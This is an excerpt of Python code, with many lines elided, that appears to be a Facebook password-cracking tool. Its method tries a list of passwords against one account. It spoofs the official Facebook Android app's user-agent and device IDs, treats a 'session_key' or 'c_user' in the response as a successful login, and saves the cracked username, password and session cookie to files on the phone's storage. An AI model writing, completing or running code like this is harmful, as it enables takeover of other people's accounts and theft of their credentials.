    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.26,width=1215,height=1235};FBLC/de_DE;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115;FBSV/10.7;FBOP/1;FBCA/armeabi-v7a:armeabi]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
                ...
                if 'session_key' in str(q) or 'c_user' in str(q):
                    ...
                    try:
                        ...
                        open("/sdcard/gmail_OK.txt", "a").write(used + "|" + pw + "\n")
                        open("/sdcard/gmail_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                        ok.append(used + pw)
                        break
                    except KeyError:
                        print(f"\r\033[1;33m[TL-JUTT] {used} | {pw} {VV}    ")
